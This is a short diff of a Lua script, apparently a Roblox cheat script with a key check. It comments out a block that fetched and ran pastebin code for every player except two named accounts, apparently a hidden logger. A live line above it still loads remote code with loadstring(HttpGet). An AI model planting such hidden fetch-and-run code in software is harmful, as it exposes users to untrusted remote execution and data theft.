@@ -8,9 +8,9 @@ end
 local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
 _G.key = _G.key or ''
 
-if game.Players.LocalPlayer.Name ~= 'VateQvateq980' and game.Players.LocalPlayer.Name ~= 'VateQOfficial' then
-	loadstring(game:HttpGet("https://pastebin.com/raw/ug8Abuj8"))()
-end
+--if game.Players.LocalPlayer.Name ~= 'VateQvateq980' and game.Players.LocalPlayer.Name ~= 'VateQOfficial' then
+	---loadstring(game:HttpGet("https://pastebin.com/raw/ug8Abuj8"))()
+--end webhok
 
 local function CheckKey(v)
     v = v or false
